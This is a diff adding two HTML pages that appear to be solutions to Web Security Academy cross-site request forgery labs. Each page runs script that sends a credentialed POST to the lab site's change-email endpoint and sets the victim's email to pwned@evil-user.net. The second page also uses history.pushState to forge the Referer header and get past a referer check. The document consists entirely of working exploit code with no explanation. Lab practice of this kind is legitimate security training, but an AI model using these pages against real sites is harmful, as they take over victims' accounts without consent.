@@ -1,0 +1,44 @@
+<html>
+
+<body>
+    <script>
+        fetch("https://0aaf00f104383333c0f32d40009000fd.web-security-academy.net/", {
+            mode: "no-cors",
+            credentials: "include"
+        }).then(function (response) {
+            fetch("https://0aaf00f104383333c0f32d40009000fd.web-security-academy.net/my-account/change-email", {
+                method: "POST",
+                mode: "no-cors",
+                credentials: "include",
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: 'email=pwned%40evil-user.net'
+            })
+        })
+    </script>
+</body>
+
+</html>
+
+<html>
+
+<body>
+    <script>
+        history.pushState('', '', '/?https://0a3f00db03d33fbec04105b40048009f.web-security-academy.net/my-account');
+        fetch("https://0a3f00db03d33fbec04105b40048009f.web-security-academy.net/my-account/change-email", {
+            method: "POST",
+            mode: "cors",
+            credentials: "include",
+            headers: {
+                'Content-Type': 'application/x-www-form-urlencoded',
+
+            },
+            referrerPolicy: 'unsafe-url',
+            body: 'email=pwned%40evil-user.net'
+        })
+
+    </script>
+</body>
+
+</html>
